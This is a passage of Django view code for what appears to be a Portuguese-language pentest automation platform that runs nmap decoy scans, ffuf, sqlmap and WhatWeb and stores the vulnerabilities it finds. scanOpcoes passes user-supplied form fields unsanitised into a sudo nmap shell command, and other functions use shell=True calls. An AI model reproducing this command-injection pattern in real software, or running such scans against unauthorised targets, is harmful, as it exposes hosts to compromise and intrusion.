import datetime
import hashlib
import ipaddress
import json
import subprocess
from django.core.files.storage import default_storage

import matplotlib
import requests
from django.contrib.auth.decorators import login_required
from django.db.models import Q
from django.http import HttpResponse, Http404, HttpResponseNotFound

from django.contrib.auth.models import User
from django.shortcuts import render, redirect, get_object_or_404

from django.contrib.auth import authenticate, login, logout
from django.contrib import messages
from django.db import models
from datetime import  datetime, timezone, timedelta



import time
import os
# Create your views here.



# Create your views here
#from core.models import Produto
from pymetasploit3.msfrpc import MsfRpcClient

from core.models import Scan, IP, Rede, FfufComandos, Diretorios, Porta, CVE_IP, CVE, SistemaOperacional, Sistema_IP, \
    Pentest_Rede, WhatWebComandos, WhatWeb, WhatWebIP, inetNum, dominioinetNum, Dominio, spfDominio, Emails, \
    SenhaMsfConsole, SubDominio, ExploitRodar, Exploit_Payload, QueryParameteres, SqlComandos, Etapas, Vulnerabilidades, \
    Vulnerabilidades_Definicoes, Hostname, Hostname_IP


def login_user(request):
    return render(request,'login.html')


def registro(request):
    return render(request,'registro.html')



def logout_user(request):
    logout(request)
    return redirect('/')
def submit_login(request):
    if request.POST:
        username = request.POST.get('username')
        password = request.POST.get('password')
        usuario = authenticate(username=username,password=password)
        if usuario is not None:
            login(request,usuario)
            return redirect('/')
        else:
            messages.error(request,"Usuário ou senha invalido")


    return  redirect('/')

def submit_registro(request):
    print(request.POST)
    if request.POST:
        senha = request.POST.get('password')
        usuario = request.POST.get ( 'username' )
        email =   request.POST.get ( 'email' )
        try:
            print("e aqui?")
            user = User.objects.create_user ( str(usuario), str(email) ,  str(senha) )




        except:
            User.objects.get(usuario = usuario)
            User.objects.get(email = email)


            return HttpResponse('<h1> Usuario já cadastrado </h1>')

        print("hey")
        return redirect('/')
    return HttpResponse('<h1> faça um post </h1>')


@login_required(login_url='/login/')
def scan_historico(request):

    dados = {"scans": Scan.objects.filter(usuario = request.user),'pagina':2}
    return render(request, 'historico_scan.html', dados)

@login_required(login_url='/login/')
def scan_id_historico(request,id):
    scan = Scan.objects.get(id=int(id))
    ips,vulnerabilidades_vetor,cve_ips_vetor,sistemas_operacionais_vetor,ip_hostname_vetor = lerArquivoXmlHistorico(scan.dataAgora,scan.usuario,"")

    critica = 0
    alta = 0
    intermediaria = 0
    baixa = 0
    informativa = 0
    for vuln in vulnerabilidades_vetor:
        cvss_inteiro = float(str(vuln.getIntegerTratarString()).split(" ")[0])
        if float(cvss_inteiro) >= 7.5:
            critica = critica + 1
        if float(cvss_inteiro) < 7.5 and float(cvss_inteiro) >= 5:
            alta = alta + 1
        if float(cvss_inteiro) < 5 and float(cvss_inteiro) >= 2.5:
            intermediaria = intermediaria + 1

        if float(cvss_inteiro) < 2.5 and float(cvss_inteiro) > 0:
            baixa = baixa + 1

        if float(cvss_inteiro) == 0:
            informativa = informativa + 1

    dados = {'ips':ips,"vulns":vulnerabilidades_vetor,"cves":cve_ips_vetor,"sistemas":sistemas_operacionais_vetor,
             "hostnames":ip_hostname_vetor,'pagina':1,
             "critica":critica,"alta":alta,"intermediaria":intermediaria,"baixa":baixa,"informativa":informativa}
    return render(request, 'historico_scan.html', dados)


@login_required(login_url='/login/')
def inicio(request,rede):
    usuario = User.objects.get(id=request.user.id)
    if rede == "WQFQWFUQWHFQWHFQWHFIWIF":
        try:
            rede = Pentest_Rede.objects.filter(usuario=usuario)[0].rede.rede
            print(rede)
            return redirect('/inicio/'+rede)
        except:
            return HttpResponse("crie uma rede associada a esse usuário")
    else:
        rede = requests.utils.unquote(rede)
        try:
            rede_objeto = Rede.objects.get(rede=rede)
        except:
            return  HttpResponse("Rede não existe")
        try:
            rede = Pentest_Rede.objects.get(rede=rede_objeto,usuario=usuario)
        except:
            return HttpResponse("crie um pentest para essa rede")



        ips_ativos = IP.objects.filter(rede =rede_objeto,ativo="up" )
        ips_desligados = IP.objects.filter(ativo = "",rede = rede_objeto)
        diretorios = Diretorios.objects.filter(ip__rede = rede_objeto)
        print(diretorios)

        redes = Pentest_Rede.objects.filter(usuario=usuario)
        whatwebTotal =  WhatWebIP.objects.filter(ip__rede = rede_objeto)

        class PortasQuantidades:
            def __init__(self, ip, quantidade):
                self.ip = ip
                self.quantidade = quantidade

        portas_quantidades = []
        for ips_quantidade in ips_ativos:
            portas_quantidades.append(
                PortasQuantidades(ips_quantidade, len(Porta.objects.filter(ip=ips_quantidade, ativo=1).exclude(status='closed').exclude(status='filtered'))))

        rede_pentest = Pentest_Rede.objects.get(rede=rede_objeto)
        queryparameteres = QueryParameteres.objects.all()

        hostnames = Hostname_IP.objects.filter(ip__rede = rede_objeto)
        dados = {'redepentest':rede_pentest, 'hostnames':hostnames,
                 'queryparameteres':queryparameteres,'ips': ips_ativos,'ips_desligados':ips_desligados,'diretorios':diretorios,'rede':rede_objeto,'redes':redes,'whatwebTotal':whatwebTotal,'portas':Porta.objects.filter(ativo=1),'rede_vpn':rede_objeto,'portas_quantidades':portas_quantidades}
        return render(request,'inicio.html',dados)

@login_required(login_url='/login/')
def inicio_tabelas(request,rede):
    usuario = User.objects.get(id=request.user.id)
    if rede == "WQFQWFUQWHFQWHFQWHFIWIF":
        try:
            rede = Pentest_Rede.objects.filter(usuario=usuario)[0].rede.rede
            print(rede)
            return redirect('/inicio/'+rede)
        except:
            return HttpResponse("crie uma rede associada a esse usuário")
    else:
        rede = requests.utils.unquote(rede)
        try:
            rede_objeto = Rede.objects.get(rede=rede)
        except:
            return  HttpResponse("Rede não existe")
        try:
            rede = Pentest_Rede.objects.get(rede=rede_objeto,usuario=usuario)
        except:
            return HttpResponse("crie um pentest para essa rede")



        ips_ativos = IP.objects.filter(rede =rede_objeto,ativo="up" )
        ips_desligados = IP.objects.filter(ativo = "",rede = rede_objeto)
        diretorios = Diretorios.objects.filter(ip__rede = rede_objeto)
        print(diretorios)

        redes = Pentest_Rede.objects.filter(usuario=usuario)
        whatwebTotal =  WhatWebIP.objects.filter(ip__rede = rede_objeto)

        class PortasQuantidades:
            def __init__(self, ip, quantidade):
                self.ip = ip
                self.quantidade = quantidade

        portas_quantidades = []
        for ips_quantidade in ips_ativos:
            portas_quantidades.append(
                PortasQuantidades(ips_quantidade, len(Porta.objects.filter(ip=ips_quantidade, ativo=1).exclude(status='closed').exclude(status='filtered'))))

        rede_pentest = Pentest_Rede.objects.get(rede=rede_objeto)
        queryparameteres = QueryParameteres.objects.all()

        hostnames = Hostname_IP.objects.filter(ip__rede = rede_objeto)
        dados = {'redepentest':rede_pentest, 'hostnames':hostnames,
                 'queryparameteres':queryparameteres,'ips': ips_ativos,'ips_desligados':ips_desligados,'diretorios':diretorios,'rede':rede_objeto,'redes':redes,'whatwebTotal':whatwebTotal,'portas':Porta.objects.filter(ativo=1),'rede_vpn':rede_objeto,'portas_quantidades':portas_quantidades}
        return render(request,'inicio_tabelas.html',dados)


@login_required(login_url='/login/')
def rede(request):
    try:
        Vulnerabilidades_Definicoes.objects.get(nome="SQL Injection",descricao="A vulnerabilidade SQL Injection permite que o atacante utilize comandos sql no servidor alvo")
    except:
        Vulnerabilidades_Definicoes.objects.create(nome="SQL Injection",descricao="A vulnerabilidade SQL Injection permite que o atacante utilize comandos sql no servidor alvo")

    return render(request,'rede.html')

def dataAtual():
    data_e_hora_atuais = datetime.now()
    diferenca = timedelta(hours=-3)
    fuso_horario = timezone(diferenca)
    data_e_hora_sao_paulo = data_e_hora_atuais.astimezone(fuso_horario)
    print(data_e_hora_sao_paulo)
    return str(data_e_hora_sao_paulo)

@login_required(login_url='/login/')
def verificarPermissoesRedePentest(rede_vpn,request):
    try:
        Pentest_Rede.objects.get(rede=Rede.objects.get(id=int(rede_vpn)),usuario=User.objects.get(id=request.user.id))
    except:

        return HttpResponse("VOCÊ NÃO TEM PERMISSÃO PRA ISSO")


def domainIp(address):
    import shlex, subprocess, ipaddress

    command = "dig +short {}".format(address)
    args = shlex.split(command)
    print(args)
    a = subprocess.Popen(args, stdout=subprocess.PIPE)

    returnCode = a.communicate()[0]
    rc = a.returncode
    for ip in returnCode.decode("utf-8").split('\n'):
        print(f'ip: {ip}')
        try:
            ip_string = ipaddress.ip_address(ip)
        except:
            pass

    print(rc)
    print(ip_string)
    return ip_string


@login_required(login_url='/login/')
def scanOpcoes(request):
    ip = request.POST.get('ip')

    rede = request.POST.get('rede')
    rede_vpn = request.POST.get('rede_vpn')
    try:
        Pentest_Rede.objects.get(rede=Rede.objects.get(id=int(rede_vpn)),usuario=User.objects.get(id=request.user.id))
    except:

        return HttpResponse("VOCÊ NÃO TEM PERMISSÃO PRA ISSO")
    vpn = Rede.objects.get(id=rede_vpn)

    versao = request.POST.get('versao')
    tipo = request.POST.get('tipo')
    pn = request.POST.get('pn')
    so =  request.POST.get('so')
    portas =  request.POST.get('portas')
    vuln =  request.POST.get('vuln')

    porta_vai = ""
    numeros = ""
    print(portas)
    print("rede: "+rede)
    if portas == "":
        porta_vai = "-"
    else:
        porta_vai = porta_vai + " "
        for porta in portas:
            try:
                numero = int(porta)
                numeros = str(numeros) + str(porta)
            except:
                if numeros != "":
                    porta_vai = porta_vai + numeros + ","
                numeros = ""

        porta_vai = porta_vai + numeros
        try:
            int(porta_vai[-1:])
        except:
            porta_vai = porta_vai[:-1]

    print(porta_vai)
    if versao != "":
        versao = ' -sV '
    if pn != "":
        pn = ' -Pn '
    if so != "":
        so = ' -O '

    if vuln != "":
        vuln = ' -script=vuln '
    def get_Tipo(tipo):
        lugares_envio = {
            '1': '  ',
            '2': ' -sU ',
            '3': ' -sT ',

        }
        return lugares_envio.get(str(tipo), str(tipo))
    tipo = get_Tipo(tipo)

    OS = " -O"
    dataAgora = dataAtual().replace(' ','')
    ipstring = ""
    ipstring = ip
    print(ip)
    ip = ip + "/" + str(rede)
    ip = ip.replace('\n', '')
    ip = ip.replace(' ', '')
    ip = ip.replace('\t', '')
    print(rede)
    print(ip)
    dominio = ""
    try:
        ip3 = ipaddress.ip_network(ipstring)

    except:
        dominio = ipstring
        ipstring = domainIp(ipstring)
        ip = ipstring
        try:
            ip_string = ipaddress.ip_address(ip)
        except:
            return HttpResponse(f'IPERRADO{ip}')
    print(ip)

    #res = subprocess.check_output("", shell=True)
    print("aqui?")
    if dominio != "":
        comando = "sudo nmap -D RND:20 "+str(versao)+ " " + str(tipo)+  " " +str(so) + " " +str(pn) + " -p" + str(porta_vai) + " " + str(dominio) + " "+ str(vuln ) + " -oX arquivos/nmap/'" + str(dataAgora) + str(request.user) + "'.xml &"
    else:
        comando = "sudo nmap -D RND:20 "+str(versao)+ " " + str(tipo)+  " " +str(so) + " " +str(pn) + " -p" + str(porta_vai) + " " + str(ip) + " "+ str(vuln ) + " -oX arquivos/nmap/'" + str(dataAgora) + str(request.user) + "'.xml &"

    print("chegou aqui?")
    os.system(comando)


    usuario  = User.objects.get(id=request.user.id)
    vpn = Rede.objects.get(id=rede_vpn)
    ip = verificarSeExisteSeNaoCriar(ipstring,usuario,vpn)

    Scan.objects.create(ip = ip,
                        dataAgora = dataAgora,
                        usuario = User.objects.get(username= request.user),
                        feito = 0,
                        comando=comando,
                        )
    return redirect('/')

def xmlBancoVerificar():
    try:
        for scan in Scan.objects.filter(feito = 0):
            print(scan.usuario)
            verificarArquivoXml(scan.dataAgora,scan.usuario)
    except:
        pass




def verificarArquivoXml(dataAgora,usuario):
    try:
        res = subprocess.check_output("cat arquivos/nmap/" + str(dataAgora) + str(usuario) + ".xml", shell=True)
    except:
        print("alo")
    #print(res)

    lerArquivoXml(dataAgora,usuario,"")
    scan = Scan.objects.get(dataAgora = dataAgora,
                                        usuario = User.objects.get(username= usuario))
    scan.feito = 1
    scan.save()


    lerArquivoXml(dataAgora, usuario,"")
    scan = Scan.objects.get(dataAgora=dataAgora,
                            usuario=User.objects.get(username=usuario))
    scan.feito = 1

    scan.save()







def lerArquivoXml(dataAgora,usuario,arquivo):
    import xml.etree.ElementTree as ET
    print(usuario)
    if arquivo == "":
        tree = ET.parse("arquivos/nmap/" + str(dataAgora) + str(usuario) + ".xml")
    else:
        tree = ET.parse(arquivo)
    root = tree.getroot()

    scan = Scan.objects.get(dataAgora=dataAgora,
                            usuario=User.objects.get(username=usuario))
    rede_vpn = scan.ip.rede

    ips = []
    sistemas_operacionais_vetor = []
    vulnerabilidades_vetor = []
    class Vulnerabilidades_Definicoes2:
        def __init__(self, title, description):
            self.nome = title
            self.descricao = description

    class Vulnerabilidades2:
        def __init__(self, ip, porta, vuln_tipo, score,grau):
            self.ip = ip
            self.porta = porta
            self.tipo = vuln_tipo
            self.path = ""
            self.parametro = ""
            self.CVSS = score
            self.impacto = ""
            self.recomendacao = ""
            self.tratada = 0
            self.grau = grau

    class Sistema_Operacional_representar:

        def __init__(self, ip, nome, probabilidade, posicao):
            self.ip = ip
            self.nome = nome
            self.posicao = posicao
            self.probabilidade = probabilidade
    class CVE_IPS_2:
        def __init__(self, ip, cve,descricao):
            self.ip = ip
            self.cve = cve
            self.descricao = descricao

    class Porta_representar:
        def __init__(self, porta, servico, produto, versao,status_porta):
            self.porta = porta
            self.servico = servico
            self.produto = produto
            self.versao = versao
            self.status_porta=status_porta

    class IP_representar:
        def __init__(self, ip, portas,status_ip):
            self.ip = ip
            self.portas = portas
            self.status_ip=status_ip

    cve_ips_vetor = []
    for child in root.findall("host"):
        for title in child.findall("address"):
            if title.attrib['addrtype'] == 'ipv4':
                ip = title.attrib['addr']
        for hostname in child.findall("hostnames"):
            print(hostname)
            for a in hostname:

                try:
                    ipObjeto = IP.objects.get(ip=str(ip), rede=rede_vpn, usuario=User.objects.get(username=usuario))

                except:
                    ipObjeto = IP.objects.create(ip=str(ip), rede=rede_vpn,
                                                 usuario=User.objects.get(username=usuario),ativo=0)
                hostname = str(a.attrib["name"])
                try:
                    hostname_objeto = Hostname.objects.get(hostname=hostname)
                except:
                    hostname_objeto = Hostname.objects.create(hostname=hostname)
                try:
                    Hostname_IP.objects.get(hostname=hostname_objeto,
                                            ip=ipObjeto)
                except:
                    Hostname_IP.objects.create(hostname=hostname_objeto,
                                            ip=ipObjeto)

        for port in child.findall("ports"):
            portas = []
            for state in child.findall("status"):
                print(state)
                status_ip = state.attrib['state']
            for ports in port.findall("port"):
                porta = ports.attrib['portid']

                for state in ports.findall("state"):
                    status_porta = state.attrib['state']

                for serviços in ports.findall("service"):
                    servico = serviços.attrib['name']
                    try:
                        produto = serviços.attrib['product']
                    except:
                        produto = "Não existe"
                    try:
                        versao = serviços.attrib['version']
                    except:
                        versao = 0
                for teste in ports.findall("script"):
                    for osss in teste.findall("table"):
                        validar = 0
                        validar_vuln = 0

                        try:

                            if str(osss.attrib['key'])[:3] == "CVE":
                                cve_texto = str(title.attrib['addr'])
                                descricao = ""
                                validar = 1


                            for element in osss:
                                if element.attrib['key'] == 'state':
                                    estado = element.text
                                    if estado == "VULNERABLE (Exploitable)" or estado == "VULNERABLE":
                                        validar_vuln = 1
                                if element.attrib['key'] == 'scores':

                                    for alou in element.findall("elem"):
                                        score = alou.text

                                if element.attrib['key'] == 'title':
                                    titulo = element.text

                                if element.attrib['key'] == 'description':
                                    print(element.attrib['key'])

                                    for alou in element.findall("elem"):
                                        print(alou.text)
                                        descricao = alou.text
                            if validar == 1:
                                cve_ips_vetor.append(CVE_IPS_2(cve_texto, osss.attrib['key'],descricao))
                                try:
                                    classe_vuln_anotar = Vulnerabilidades_Definicoes.objects.get(nome = titulo,descricao= descricao)
                                except:
                                    classe_vuln_anotar = Vulnerabilidades_Definicoes.objects.create(nome = titulo,descricao= descricao)

                            if validar_vuln == 1:
                                vulnerabilidades_vetor.append(Vulnerabilidades2(ip, porta, classe_vuln_anotar, score))

                        except:
                            print("não é vulneravel")

                porta_objeto = Porta_representar(porta, servico, produto, versao,status_porta)
                portas.append(porta_objeto)
            ips.append(IP_representar(ip, portas,status_ip))

        for os in child.findall("os"):
            contador = 0
            for oss in os.findall("osmatch"):
                contador = contador + 1
                sistema_operacional = str(oss.attrib['name'])

                if contador == 1:

                    sistema_operacional_principal = str(oss.attrib['name'])
                    sistema_operacional_principal_probabilidade = str(oss.attrib['accuracy'])

                    print(sistema_operacional_principal)
                    print(sistema_operacional_principal_probabilidade)
                sistemas_operacionais_vetor.append(Sistema_Operacional_representar(str(ip), sistema_operacional,
                                            sistema_operacional_principal_probabilidade, contador))

        for os in child.findall("hostscript"):
            for oss in os.findall("script"):
                print("id script")
                print(oss.attrib['id'])
                print('\n')
                titulo_vuln = ""
                cve_peguei = ""
                csvv = 0
                for osss in oss.findall("table"):
                    print("cve23")
                    print(str(ip))
                    print(porta)
                    print(osss.attrib['key'])
                    print(osss.text)
                    print("\n\n")
                    for elemm in osss.findall("elem"):
                        print("orx")
                        print(elemm.attrib['key'])
                        if elemm.attrib['key'] == "title":
                            titulo_vuln = elemm.text
                        if elemm.attrib['key'] == "state":
                            stado_vuln = elemm.text

                        print(elemm.text)
                        print("\n\n")
                        for elemm2 in osss.findall("table"):
                            print(elemm2.attrib)
                            print("eita")

                            if elemm2.attrib['key'] == 'ids':
                                cve_peguei = elemm2.find("elem").text
                                print(cve_peguei)
                            if elemm2.attrib['key'] == 'description':
                                print(elemm2.text)
                                print(elemm2.attrib)
                                descricao = elemm2.find("elem").text

                            if elemm2.attrib['key'] == 'scores':
                                csvv = elemm2.find("elem").text

                if ip != "" and titulo_vuln != "":
                    try:
                        classe_vuln_anotar = Vulnerabilidades_Definicoes.objects.get(nome = titulo_vuln, descricao = descricao)
                    except:
                        classe_vuln_anotar = Vulnerabilidades_Definicoes.objects.create(nome=titulo_vuln,
                                                                                     descricao=descricao)

                    # cve_ips_vetor.append(classe_vuln_anotar)
                    if cve_peguei != "":
                        cve_ips_vetor.append(CVE_IPS_2(ip, cve_peguei, descricao))
                    vulnerabilidades_vetor.append(Vulnerabilidades2(ip, porta, classe_vuln_anotar, csvv, stado_vuln))


    print("---------ips---------")
    for ip in ips:
        print(ip.ip)
        try:
            ipObjeto = IP.objects.get(ip=str(ip.ip),rede=rede_vpn,usuario=User.objects.get(username=usuario))
            ipObjeto.ativo = ip.status_ip
            ipObjeto.save()
        except:
            ipObjeto = IP.objects.create(ip=str(ip.ip),rede=rede_vpn,usuario=User.objects.get(username=usuario),ativo=ip.status_ip)

        for porta in ip.portas:
            print(porta.porta)

            try:
                portaIp = Porta.objects.get(porta=int(porta.porta), ip=ipObjeto)
                Porta.objects.create(porta=int(porta.porta),
                                     ip=ipObjeto,
                                     servico=porta.servico,
                                     produto=porta.produto,
                                     versao=porta.versao,
                                     vulneravel=0,
                                     descricao="",
                                     tipo=0,
                                     status=porta.status_porta,

                                     )
            except:

                Porta.objects.create(porta=int(porta.porta),
                                     ip=ipObjeto,
                                     servico=porta.servico,
                                     produto=porta.produto,
                                     versao=porta.versao,
                                     vulneravel=0,
                                     descricao="",
                                     tipo=0,ativo = 0,
                                     status=porta.status_porta,

                                     )
    for vuln in vulnerabilidades_vetor:
        ipObjeto = IP.objects.get(ip=str(vuln.ip), rede=rede_vpn, usuario=User.objects.get(username=usuario))
        portaIp = Porta.objects.get(porta=int(vuln.porta), ip=ipObjeto,ativo = 1)

        score = vuln.CVSS
        try:
            Vulnerabilidades.objects.get(ip=ipObjeto,porta=portaIp,tipo=vuln.tipo,path=vuln.path,parametro=vuln.parametro,CVSS=score,impacto=vuln.impacto,recomendacao=vuln.recomendacao,grau=vuln.grau)
        except:
            Vulnerabilidades.objects.create(ip=ipObjeto,porta=portaIp,tipo=vuln.tipo,path=vuln.path,parametro=vuln.parametro,CVSS=score,impacto=vuln.impacto,recomendacao=vuln.recomendacao,grau=vuln.grau)


    for cve in cve_ips_vetor:
        print(cve.cve)
        print(cve.ip)
        try:
            cve2 = CVE.objects.get(cve=str(cve.cve))
        except:
            cve2 = CVE.objects.create(cve=str(cve.cve))

        try:
            cve_ajeitar = CVE_IP.objects.get(ip=IP.objects.get(ip=str(cve.ip), rede=rede_vpn),
                               cve=cve2)
            cve_ajeitar.descricao = cve.descricao
            cve_ajeitar.save()
        except:
            try:
                cve_ip_Ver = str(cve.ip)
                CVE_IP.objects.create(ip=IP.objects.get(ip=str(cve.ip), rede=rede_vpn),
                                      cve=cve2,descricao=cve.descricao)
            except:
                #endereço fisico
                pass
    for sistemas in sistemas_operacionais_vetor:
        try:
            so2 = SistemaOperacional.objects.get(nome=sistemas.nome)
        except:
            so2 = SistemaOperacional.objects.create(nome=sistemas.nome)

        variavel = sistemas.ip
        try:
            try:
                Sistema_IP.objects.get(ip=IP.objects.get(ip=str(sistemas.ip), rede=rede_vpn),
                                       )
            except:
                Sistema_IP.objects.create(ip=IP.objects.get(ip=str(sistemas.ip), rede=rede_vpn),probabilidade=sistemas.probabilidade,posicao=sistemas.posicao,
                                       sistema=so2)
        except:
            #quando vim um ip que na verdade é um endereço fisico
            pass
        print(sistemas.ip)
        print(sistemas.nome)
        print(sistemas.probabilidade)
        print(sistemas.posicao)
    scan.feito = 1
    scan.save()
def verificarScan():
    return Scan.objects.filter(feito = 0)

def dirbBancoVerificar():
    contador = 0

    try:

        scan = FfufComandos.objects.get(feito = 2)

        verificarArquivoFfuf(scan.dataAgora, scan.usuario)

    except:

        for scan in FfufComandos.objects.filter(feito = 0):
            if contador == 0:
                if len(FfufComandos.objects.filter(feito = 2)) == 0:
                    contador = 1

                    print(scan.usuario)
                    os.system(scan.comando)
                    scan.feito = 2
                    scan.save()
            break


def sqlmapVerificar():




            scan = SqlComandos.objects.filter(feito=2)
            for a in scan:

                    verificarArquivoSqlmap(a.dataAgora, a.usuario)

            contador = 0
            for scan in SqlComandos.objects.filter(feito = 0):
                if contador == 0:
                    contador = 1

                    print(scan.usuario)
                    #os.system(scan.comando)
                    scan.feito = 2
                    scan.save()
                break


def WhatWebVerificar():

    try:
        scan = WhatWebComandos.objects.get(feito = 2)
        verificarArquivoWhatWeb(scan.arquivo,scan.diretorio.ip)
        scan.feito = 1
        scan.save()
    except:
        contador = 0
        for scan in WhatWebComandos.objects.filter(feito = 0):
            if contador == 0:
                contador = 1
                scan.feito = 2
                scan.save()
            break

def verificarArquivoSqlmap(dataAgora, usuario):
    from urllib.parse import urlparse
    teste = 1
    if teste == 1:
        print("entrei")
        target_file = "arquivos/sqlmap/"  + str(usuario) + str(dataAgora) +".txt"
        print(target_file)
        target_open = open(target_file, 'r',encoding = "ISO-8859-1")

        scan = SqlComandos.objects.get(dataAgora=dataAgora,
                                        usuario=User.objects.get(username=usuario))
        try:
                saida = subprocess.check_output(f'cat  "{target_file}" | grep "is vulnerable"',
                                            shell=True).decode("UTF-8")


                print(saida)

                parametro = ""
                validar = 0
                for percorrer in saida:
                    print(percorrer)
                    if validar == 1:
                        parametro = parametro + percorrer
                    if percorrer == "'":
                        validar = validar + 1
                parametro = parametro[:-1]
        except:
            saida = subprocess.check_output(f'cat  "{target_file}" | grep "Parameter:"',
                                            shell=True).decode("UTF-8")
            parametro = ""
            validar = 0
            for percorrer in saida.split(':')[1]:
                print(percorrer)
                if validar == 1:
                    parametro = parametro + percorrer
                if percorrer == " ":
                    validar = validar + 1
            parametro = parametro

            pass

        print(parametro)
        parametro = parametro.replace(" ","")
        queryparameters = QueryParameteres.objects.filter(diretorio=scan.diretorio)

        for query in queryparameters:
            if str(query.parametro) == str(parametro):
                query.vulneravel = 1
                query.save()

                vuln = Vulnerabilidades_Definicoes.objects.get(nome="SQL Injection",
                                                        descricao="A vulnerabilidade SQL Injection permite que o atacante utilize comandos sql no servidor alvo")
                try:
                    Vulnerabilidades.objects.get(ip=scan.diretorio.ip,porta=Porta.objects.get(ip=scan.diretorio.ip,porta= scan.diretorio.porta,ativo=1),tipo=vuln,path=scan.diretorio.path,parametro=parametro,CVSS=8,impacto="Acesso a comandos sql no banco do servidor",recomendacao="Tratar o parametro " + str(parametro))
                except:
                    Vulnerabilidades.objects.create(ip=scan.diretorio.ip, porta=Porta.objects.get(ip=scan.diretorio.ip,
                                                                                               porta=scan.diretorio.porta,
                                                                                               ativo=1), tipo=vuln,
                                                 path=scan.diretorio.path, parametro=parametro, CVSS=8,
                                                 impacto="Acesso a comandos sql no banco do servidor",
                                                 recomendacao="Tratar o parametro " + str(parametro))

    scan.feito = 1
    scan.save()

def verificarArquivoFfuf(dataAgora, usuario):
    from urllib.parse import urlparse
    teste = 1
    if teste == 1:
        print("entrei")
        target_file = "arquivos/ffuf/" + str(dataAgora) + str(usuario) + ".txt"
        target_open = open(target_file, 'r',encoding = "ISO-8859-1")

        scan = FfufComandos.objects.get(dataAgora=dataAgora,
                                        usuario=User.objects.get(username=usuario))
        teste = 0
        contador = 0
        for linha in target_open:

                if teste == 1:
                    valores = linha.split(',')
                    fuzz = valores[0]
                    url = valores[1]
                    print("url"  + url)
                    path = urlparse(url).path
                    httpcode = valores[4]
                    redirect_que_vai = valores[2]
                    if contador < 20:
                        if redirect_que_vai != "":
                            """
                            saida = subprocess.check_output(f'curl -i {redirect_que_vai}',
                                                                      shell=True).decode("UTF-8")
                            print(saida)
            
                            """
                            import requests
                            headers = {
                                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36"}

                            r = requests.get(redirect_que_vai, headers=headers)
                            print(r.url)
                            path = urlparse(r.url).path
                            httpcode = 200
                            contador = contador + 1

                    ip = scan.ip
                    porta = scan.porta
                    if redirect_que_vai != "":
                        path = urlparse(r.url).path
                    try:
                            path_filtrar = f'{path}'.split('?')[0]
                    except:
                            path_filtrar = path



                    print(f'path {path_filtrar}')
                    diretorio = verificarSeExisteDiretorioSeNaoCriar(ip, porta, path_filtrar, httpcode, path)
                    alterarDiretoriosHttpCode(ip, porta, path_filtrar, httpcode, diretorio, path)

                if teste == 0:
                    teste = 1
        target_open.close()
        lerRobotstxt(ip,porta)
        lerSiteMap(ip,porta)
        scan.feito = 1
        scan.save()

def verificarSeExisteDiretorioSeNaoCriar(ip, porta, path_filtrar, httpcode, path):
    try:
        diretorio = Diretorios.objects.get(ip=ip, porta=porta, path=path_filtrar)


    except:

        diretorio = criarDiretorios(ip, porta, path_filtrar, httpcode, path)
    CriarOuPegarQueryParameteres(diretorio, path)
    return diretorio

def alterarDiretoriosHttpCode(ip,porta,path_filtrar,httpcode,diretorio,path):
    diretorio = Diretorios.objects.get(ip=ip, porta=porta, path=path_filtrar)
    diretorio.http_code = httpcode
    diretorio.save()
    return diretorio
def criarDiretorios(ip,porta,path_filtrar,httpcode,path):
    diretorio = Diretorios.objects.create(ip=ip, porta=porta, path=path_filtrar, http_code=httpcode)
    try:
        for name in path.split('?')[1].split('&'):
            print(name.split('=')[0])
            CriarOuPegarQueryParameteres(diretorio, name)

    except:
        return diretorio

    return diretorio

def CriarOuPegarQueryParameteres(diretorio,name):
    try:
        name = name.split('?')[1]
    except:
        pass
    try:
        try:
            query = QueryParameteres.objects.get(diretorio=diretorio, parametro=name.split('=')[0],
                                       )
        except:
            query = QueryParameteres.objects.create(diretorio=diretorio, parametro=name.split('=')[0],
                                            valor=name.split('=')[1])
    except:
        query = ""

    return query
def lerSiteMap(ip,porta):
    import requests
    from urllib.parse import urlparse
    ip_string = ip.ip
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36"}

    try:
        r = requests.get("http://"+ip_string + f':{porta}/sitemap.xml', headers=headers)
    except:
        r = requests.get("https://"+ip_string + f':{porta}/sitemap.xml', headers=headers)
    import xml.etree.ElementTree as ET
    try:
        root = ET.fromstring(r.content.decode("utf-8"))
        for child in root:
            for subelem in child:
                path = urlparse(subelem.text).path
                try:
                    try:
                        r2 = requests.get(f'http://{ip_string}:{porta}{path}', headers=headers)
                    except:
                        r2 = requests.get(f'https://{ip_string}:{porta}{path}', headers=headers)

                except:
                    continue
                httpcode = r2.status_code
                try:
                    path_filtrar = f'{path}'.split('?'[0])
                except:
                    path_filtrar = path

                diretorio = verificarSeExisteDiretorioSeNaoCriar(ip, porta, path_filtrar, httpcode, path)
                alterarDiretoriosHttpCode(ip, porta, path_filtrar, httpcode, diretorio, path)
    except:
        pass



def lerRobotstxt(ip,porta):
    ip_string = ip.ip
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36"}
    try:
        r = requests.get("http://"+ip_string + f':{porta}/robots.txt', headers=headers)
    except:
        r = requests.get("https://"+ip_string + f':{porta}/robots.txt', headers=headers)

    print(r.content.decode("utf-8"))
    for a in r.content.decode("utf-8").split('\n'):
        if "Disallow" in a or 'Allow' in a:
            print("está")
            path = a.split(':')[1]
            print(path)
            path = requests.utils.unquote(path).strip()
            try:
                r2 = requests.get(f'https://{ip_string}:{porta}{path}', headers=headers)
            except:
                r2 = requests.get(f'http://{ip_string}:{porta}{path}', headers=headers)

            httpcode = r2.status_code
            try:
                path_filtrar = f'{path}'.split('?'[0])
            except:
                path_filtrar= path

            diretorio = verificarSeExisteDiretorioSeNaoCriar(ip, porta, path_filtrar, httpcode, path)
            alterarDiretoriosHttpCode(ip, porta, path_filtrar, httpcode, diretorio, path)





def dirbOpcoes(request):


    ip = request.POST.get('ip')
    rede = request.POST.get('rede')
    path = request.POST.get('path')
    user_agent = request.POST.get('user_agent')
    extencao = request.POST.get('extencao')
    portas =  request.POST.get('portas')
    https =  request.POST.get('https')
    wordlist =  request.POST.get('wordlist')

    path_vai = ""
    user_agent_vai = ""
    extencao_vai = ""



    if str(path) != "":
        path_vai = path


    if str(user_agent) != "":
        user_agent_vai = f' -a "{user_agent}" '
    if str(extencao) != "":
        extencao_vai = f' -e {extencao} '

    if portas == "":
